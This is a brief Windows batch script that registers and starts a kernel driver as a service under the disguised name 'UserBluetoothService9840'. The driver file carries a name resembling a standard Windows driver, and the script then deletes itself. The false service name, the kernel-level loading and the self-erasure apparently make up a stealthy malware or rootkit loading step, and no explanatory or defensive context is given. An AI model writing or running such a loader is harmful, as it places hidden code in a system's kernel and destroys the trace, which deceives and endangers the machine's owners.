@echo off
cd %~dp0
sc create UserBluetoothService9840 binpath=C:\Windows\System32\drivers\EhStorTcgMdr.sys type=kernel
sc start UserBluetoothService9840
del "%~f0"